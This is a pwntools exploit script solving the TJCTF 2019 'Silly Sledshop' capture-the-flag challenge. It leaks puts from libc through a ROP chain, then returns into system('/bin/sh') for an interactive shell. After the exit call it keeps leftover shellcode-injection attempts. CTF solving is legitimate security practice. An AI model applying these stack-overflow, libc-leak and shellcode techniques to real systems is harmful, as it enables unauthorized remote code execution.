from pwn import *
import time

# TJCTF 2019 - Silly Sledshop
# Open process
SERVER = True
if SERVER:
	HOST = 'p1.tjctf.org'
	PORT = 8010
	p = remote(HOST,PORT)
else:
	p = process('sledshop')

# LIBC offsets
if SERVER:
	# https://libc.blukat.me/d/libc6-i386_2.23-0ubuntu11_amd64.symbols
	offset_exit = 0x0002e7b0
	offset_system = 0x0003a940
	offset_puts = 0x0005f140
	offset_binsh_string = 0x15902b

else:
	# ldd --version
	# ldd (Debian GLIBC 2.27-4) 2.27
	offset_exit = 0x0030a30    # readelf -s /lib32/libc.so.6 | grep exit
	offset_system = 0x003d7e0  # readelf -s /lib32/libc.so.6 | grep system
	offset_puts = 0x0067e30    # readelf -s /lib32/libc.so.6 | grep puts
	offset_binsh_string = 0x017c968  # strings -a -t x /lib32/libc.so.6 | grep /bin/sh

# Found by using Hopper disassembnler
# PLT and GOT entries
addr_puts_plt = 0x080483f0  # j_puts:   080483f0  jmp dword [puts@GOT]
addr_puts_got = 0x0804a01c  # puts@GOT: 0804a01c  dd 0x0804b010
# main function
addr_main = 0x08048617

# buffer size to control eip
offset = 80

'''
addr_libc_base = 0xf7552000  # ldd ./vuln | grep libc
addr_exit = addr_libc_base + offset_exit
addr_system = addr_libc_base + offset_system
addr_puts = addr_libc_base + offset_puts
addr_binsh = addr_libc_base + offset_binsh_string
'''

'''
payload = '\x00' * (offset)
payload += p32(addr_system) # return1: puts_got
payload += p32(addr_exit) # return2: main
payload += p32(addr_binsh) # return1: param1
p.sendline(payload)
'''

print(p.recv())

payload = '\x90' * (offset)
payload += p32(addr_puts_plt) # return1: puts_got
payload += p32(addr_main) # return2: main
payload += p32(addr_puts_got) # return1: param1
p.sendline(payload)

print(p.recvuntil('Sorry, we are closed.\n'))
leak = p.recv(4)[::-1]
addr_leak = int(leak.encode('hex'), 16)
print('Leaked puts@libc:', hex(addr_leak))

addr_libc_base = addr_leak - offset_puts
addr_exit = addr_libc_base + offset_exit
addr_system = addr_libc_base + offset_system
addr_puts = addr_libc_base + offset_puts
addr_binsh = addr_libc_base + offset_binsh_string
print('Found libc base:', hex(addr_libc_base))




payload = '\x90' * (offset)
payload += p32(addr_system) # return1:
payload += p32(addr_exit) # return2: main
payload += p32(addr_binsh) #return1 param1
p.sendline(payload)



#time.sleep(0.1)
final = p.recv()
print(final)

if 'timeout: the monitored command dumped core' in final:
	quit()

p.sendline('ls -la')
p.interactive()

#############################333
quit()

addr_puts_plt = p32(0x080483f0)
#addr_puts_got = p32(0x0804a01c)
addr_puts_got = p32(0x0804b010) 
addr_main = p32(0x08048617)

#jmp_esp = p32(0x08048493)
#jmp_esp = p32(0x08048617)#main
#jmp_esp = p32(0x08048563)#shop_list
jmp_esp = p32(0xffffdcbc) # gdb
jmp_esp = p32(0xffb7d8e0)

shellcode = asm(shellcraft.sh())
print('len(shellcode)', len(shellcode))
#: Exploit code

payload = '\x90' * (offset-len(shellcode))
payload += shellcode
'''
payload = '\x90' * (64-len(shellcode))
payload += shellcode
payload += '\x00' * 4
payload += '\x90' * (offset-len(payload))
'''
payload += addr_puts_plt # return1: puts_got
payload += addr_main # return2: main
payload += addr_puts_plt # return1: param1

#: Send payload
p.sendline(payload)
print(p.recvuntil('Sorry, we are closed.\n'))

'''
addr_puts_plt = p.recv(4)[::-1]
print(addr_puts_plt)
print(p.recv())
'''

payload = '\x90' * (offset-len(shellcode))
payload += shellcode
payload += addr_puts_got # return1: puts_got
payload += addr_main # return2: main
payload += addr_puts_plt #p32(u32(addr_puts_plt) - offset_puts + offset_binsh_string) # return1: param1

p.sendline(payload)
print(p.recv())

p.interactive()

core = Coredump('./core')
